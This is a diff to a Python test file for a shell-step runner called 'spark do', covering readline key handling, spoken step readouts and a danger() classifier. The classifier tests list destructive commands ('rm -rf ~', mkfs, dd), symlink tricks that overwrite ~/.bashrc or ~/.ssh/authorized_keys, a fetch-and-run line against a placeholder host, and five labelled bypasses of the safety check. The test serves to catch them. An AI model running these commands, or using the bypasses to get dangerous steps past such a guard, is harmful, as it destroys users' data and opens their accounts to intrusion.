@@ -2118,10 +2118,25 @@ def chat_voice_pty_cases(t, env, home):
     # an arrow key is a sequence that starts with Esc: the chat goes on
     st, text, alive = drive(e, [("\nchat>", b"\x1b[A", 1.5), (None, b"\x15/q\r", 1.0)])
     t.ok(alive[0] and ended(st), "chat pty (%s): an arrow (Esc [ A) does not end the chat; /q does" % lib, text[-300:])
-    # Esc with text on the line: nothing ends, nothing is sent
-    st, text, alive = drive(e, [("\nchat>", b"hello there", 0.3), (None, b"\x1b", 1.5), (None, b"\x15\x15/q\r", 1.0)])
+    # Esc with text on the line: nothing ends, nothing is sent. Under GNU
+    # readline the lone Esc is dropped, so ONE Ctrl-U clears the line (the
+    # Esc never makes it Alt-Ctrl-U); libedit keeps a lone Esc as its own
+    # Alt prefix (no hook sees its keys), so there it takes a second one
+    clear_line = b"\x15" if lib == "GNU readline" else b"\x15\x15"
+    st, text, alive = drive(e, [("\nchat>", b"hello there", 0.3), (None, b"\x1b", 1.5), (None, clear_line + b"/q\r", 1.0)])
     t.ok(alive[1] and ended(st) and "The output means X." not in text,
-         "chat pty (%s): Esc with text on the line does not end the chat, and sends nothing" % lib, text[-300:])
+         "chat pty (%s): Esc with text on the line does not end the chat, and sends nothing; %s Ctrl-U clears it"
+         % (lib, "one" if lib == "GNU readline" else "two"), text[-300:])
+    # a Ctrl-C inside the hook's Esc wait is the chat's Ctrl-C: the line
+    # is cleared and a fresh prompt drawn, nothing sent, the chat goes on
+    # (GNU: the hook's wait; a libedit line's keys are libedit's own)
+    if lib == "GNU readline":
+        st, text, alive = drive(e, [("\nchat>", b"hello there", 0.3), (None, b"\x1b", 0.1), (None, b"\x03", 1.5),
+                                    ("\nchat>", b"/q\r", 1.0)])
+        t.ok(alive[1] and ended(st) and "The output means X." not in text and "Traceback" not in text
+             and "Exception ignored" not in text,
+             "chat pty (%s): a Ctrl-C inside the Esc wait clears the line as Ctrl-C does; nothing sent" % lib,
+             text[-300:])
 
     # awake, mode on: the greeting and the goodbye spoken, a reply only
     # after /aloud; Esc on the empty line ends with the goodbye
@@ -5149,24 +5164,43 @@ def main():
              "spark do: the same block onto a file that exists is danger -- the typed yes; `no` runs nothing",
              out2 + err2)
         os.remove(work + "/script.py")
-        # v1.70 clear mode: the step read aloud -- a block by its file and
-        # its lines -- the prompt's choices once, the end; stdout as ever
+        # v1.70 clear mode: the step read aloud -- every line outside the
+        # here-document by its symbols, the body by its file and its lines
+        # -- the prompt's choices once, the end; stdout as ever
         _spoke = os.path.join(home, "do-spoken")
+        _HEAD = 'step 1: cat, into, script.py, from from quote EOF quote. a here-document writing script.py, 3 lines of text.'
         rc2, out3, err2 = spark("do", "blockstep", stdin="\n", cwd=work,
                                 extra=dict(hook, SPARK_VOICE="clear", SPARK_VOICE_STUB=_spoke))
         _heard = open(_spoke).read().splitlines() if os.path.exists(_spoke) else []
-        t.ok(rc2 == 0 and _heard[:2] == ["step 1: a here-document writing script.py, 5 lines. write the script.",
-                                         "Enter runs it, e edits, s skips, q quits."]
+        t.ok(rc2 == 0 and _heard[:2] == ["%s write the script." % _HEAD,
+                                         "Enter runs it, r reads it, e edits, s skips, q quits."]
              and _heard[-1] == "done: all done" and "     1  cat > script.py <<'EOF'" in out3
              and open(work + "/script.py").read() == _script,
-             "spark do, clear: the block read as a here-document writing script.py, 5 lines; the choices once; "
-             "the end", repr((_heard, out3[-300:], err2[-300:])))
+             "spark do, clear: the block read line by line, the body as a here-document writing script.py, 3 lines "
+             "of text; the choices once (r among them); the end", repr((_heard, out3[-300:], err2[-300:])))
         os.remove(_spoke)
+        os.remove(work + "/script.py")
+        # r: every line printed again, numbered, and spoken; then asked again
+        rc2, out3, err2 = spark("do", "blockstep", stdin="r\n\n", cwd=work,
+                                extra=dict(hook, SPARK_VOICE="clear", SPARK_VOICE_STUB=_spoke))
+        _heard = open(_spoke).read().splitlines() if os.path.exists(_spoke) else []
+        t.ok(rc2 == 0 and out3.count("     4      print(\"two\")") == 2
+             and out3.count("Enter runs it, r reads it, e edits, s skips, q quits:") == 2
+             and 'line 2: print( quote hello, from, the, block quote ).' in "\n".join(_heard)
+             and "line 5: EOF." in "\n".join(_heard) and open(work + "/script.py").read() == _script,
+             "spark do, clear: r prints every line of the block again and speaks each, then asks again; Enter runs it",
+             repr((_heard, out3[-600:])))
+        os.remove(_spoke)
+        os.remove(work + "/script.py")
+        rc2, out3, err2 = spark("do", "blockstep", stdin="r\nq\n", cwd=work, extra=hook)
+        t.ok(rc2 == 0 and out3.count("     4      print(\"two\")") == 1 + 1 and "stopped after 0 steps" in out3,
+             "spark do: r reads the block at the terminal without the voice too; q quits after it", out3[-600:])
+        with open(work + "/script.py", "w") as f:
+            f.write(_script)
         rc2, out3, err2 = spark("do", "blockstep", stdin="no\n", cwd=work,
                                 extra=dict(hook, SPARK_VOICE="clear", SPARK_VOICE_STUB=_spoke))
         _heard = open(_spoke).read().splitlines() if os.path.exists(_spoke) else []
-        t.ok(rc2 == 0 and _heard[:1] and _heard[0].startswith("warning: ")
-             and "step 1: a here-document writing script.py, 5 lines." in _heard[0]
+        t.ok(rc2 == 0 and _heard[:1] and _heard[0].startswith("warning: ") and _HEAD in _heard[0]
              and "this can destroy data -- type yes to run it." in _heard
              and open(work + "/script.py").read() == _script,
              "spark do, clear: a danger block's warning comes first; the typed yes still decides", repr(_heard))
@@ -5184,20 +5218,53 @@ def main():
              and "\r" not in out2 and os.path.isdir(work + "/junk"),
              "spark do: a block carrying a CR is refused as done (do.BLOCK_CONTROL); nothing ran", repr(out2) + err2)
         os.rmdir(work + "/junk")
-        # danger(): a new file is no loss, an existing one is; every other
-        # pattern is never read past
+        # danger(): the one step read past is a here-document writing ONE
+        # new file and nothing else; every other step keeps v1.69's
+        # verdict (persona.is_dangerous, each line too) -- the review's
+        # five bypasses among them
         open(work + "/there.txt", "w").write("keep\n")
-        for _c, _want, _why in (("echo hi > new.txt", False, "a redirect onto a new file"),
-                                ("echo hi >| new.txt", False, "a >| redirect onto a new file"),
-                                ("echo hi > there.txt", True, "a redirect onto a file that is there"),
-                                ("cat > there.txt <<'EOF'\nx\nEOF", True, "a here-document onto a file that is there"),
-                                ("rm -f new.txt > new.log", True, "rm with a new-file redirect"),
-                                ("dd if=/dev/zero of=new.bin > new.log", True, "dd with a new-file redirect"),
-                                ("cd sub && echo hi > there.txt", True, "a cd: the cwd is not where it lands"),
-                                ("echo hi > $HOME/new.txt", True, "a target the shell rewrites"),
-                                ("echo hi 2> new.log", True, "2> is a stream, not read past"),
-                                ("echo one\nmkfs.ext4 new.img", True, "mkfs on a block's second line")):
+        os.makedirs(work + "/realdir", exist_ok=True)
+        if not os.path.lexists(work + "/linkdir"):
+            os.symlink(home, work + "/linkdir")
+        for _c, _want, _why in (
+                ("cat > new.txt <<'EOF'\nx\nrm -rf ~\nEOF", False, "one here-document writing a new file"),
+                ('cat > new.txt <<"EOF"\nx\nEOF', False, "one here-document, the delimiter double-quoted"),
+                ("cat <<'EOF' > new.txt\nx\nEOF", False, "cat <<'D' > F"),
+                ("cat > new.txt <<EOF\nhello $USER\nEOF", False, "an unquoted delimiter, no substitution"),
+                ("cat > realdir/new.txt <<'EOF'\nx\nEOF", False, "a new file in a real directory"),
+                ("cat > new.txt <<EOF\n$(rm -rf ~)\nEOF", True, "an unquoted delimiter whose body substitutes"),
+                ("cat > there.txt <<'EOF'\nx\nEOF", True, "a here-document onto a file that is there"),
+                ("cat > new.txt <<'EOF'\nx\nEOF\nrm -rf ~", True, "a here-document, then a line after it"),
+                ("cat > new.txt <<'EOF'\nx\nEOF\nx\nEOF", True, "the delimiter inside the body: text after it runs"),
+                ("cat > linkdir/new.txt <<'EOF'\nx\nEOF", True, "a here-document through a symlinked directory"),
+                ("cat > nodir/new.txt <<'EOF'\nx\nEOF", True, "a directory that is not there"),
+                ("cat > ../new.txt <<'EOF'\nx\nEOF", True, "a .. in the file"),
+                ("echo hi > new.txt", True, "a one-line redirect onto a new file: v1.69's verdict"),
+                ("echo hi >| new.txt", True, "a >| redirect onto a new file: v1.69's verdict"),
+                ("echo hi > there.txt", True, "a redirect onto a file that is there"),
+                ("rm -f new.txt > new.log", True, "rm with a new-file redirect"),
+                ("dd if=/dev/zero of=new.bin > new.log", True, "dd with a new-file redirect"),
+                ("echo one\nmkfs.ext4 new.img", True, "mkfs on a block's second line"),
+                # the review's five
+                ("ln -s ~/.bashrc newlink\necho evil > newlink", True, "bypass 1: a link made, then written through"),
+                ("ln -s ~/.bashrc newlink && echo evil > newlink", True, "bypass 1, on one line"),
+                ("mkdir d && ln -s ~/.ssh d/k\necho x > d/k/authorized_keys", True,
+                 "bypass 2: a directory and a symlink in it"),
+                ("c''d ~\necho x > .zshrc", True, "bypass 3: a quoted cd"),
+                ("eval 'c''d' ~; echo x > .zshrc", True, "bypass 3: an eval'd cd"),
+                ("echo x > new.txt; mv new.txt there.txt", True, "bypass 4: written, then moved onto a file"),
+                ("cat > s.sh <<'EOF'\nrm -rf ~\nEOF\nsh s.sh", True, "bypass 5: a script written, then run")):
             t.ok(_do.danger(_c, work) is _want, "do.danger: %s -> %s" % (_why, _want), _c)
+        for _c, _want in (("cat > s.sh <<'EOF'\necho hi\nEOF\nsh s.sh", True),
+                          ("printf 'x' >> s.sh; bash s.sh", True), ("echo hi | tee run.sh; source run.sh", True),
+                          ("curl -o get.sh https://x.invalid/g; sh ./get.sh", True),
+                          ("printf 'x' > tool; chmod +x tool; ./tool", True),
+                          ("cp a.txt b.txt; cat b.txt", False), ("sh build.sh > build.log", False),
+                          ("python3 -m venv .venv", False)):
+            t.ok(bool(_do._opaque(_c)) is _want,
+                 "do._opaque: a step that runs a file it writes is opaque over --porcelain -> %s" % _want, _c)
+        os.remove(work + "/linkdir")
+        os.rmdir(work + "/realdir")
         os.remove(work + "/there.txt")
         # e on a block: $EDITOR on a 0600 temp file, removed after; the
         # edited text is the step
@@ -5211,13 +5278,14 @@ def main():
         _edlog = os.path.join(home, "do-editor.log")
         _edenv = dict(hook, VISUAL=sys.executable + " " + _ed, EDITOR=sys.executable + " " + _ed, DO_ED_LOG=_edlog,
                       DO_ED_TEXT="printf 'edited\\n' > edited.txt\necho EDITED-BLOCK\n")
-        rc2, out2, err2 = spark("do", "blockedit", stdin="e\n", extra=_edenv, cwd=work)
+        rc2, out2, err2 = spark("do", "blockedit", stdin="e\nyes\n", extra=_edenv, cwd=work)
         _tmp = open(_edlog).read() if os.path.exists(_edlog) else "/nonexistent"
         _seen = open(_tmp + ".seen").read() if os.path.exists(_tmp + ".seen") else ""
         t.ok(rc2 == 0 and "EDITED-BLOCK" in out2 and open(work + "/edited.txt").read() == "edited\n"
              and "edited: printf 'edited\\n' > edited.txt   (2 lines)" in out2 and "     2  echo EDITED-BLOCK" in out2
              and not os.path.exists(work + "/script.py"),
-             "spark do: e on a block opens $EDITOR on it; the edited block is shown, then runs", out2 + err2)
+             "spark do: e on a block opens $EDITOR on it; the edited block is shown, its redirect asks the typed "
+             "yes, then runs", out2 + err2)
         t.ok(_seen == "600 " + BLOCK_STEP + "\n" and not os.path.exists(_tmp),
              "spark do: the editor's file is the block, 0600, and it is removed after", (_seen, _tmp))
         newest = max(os.listdir(threads), key=lambda f: os.path.getmtime(os.path.join(threads, f)))
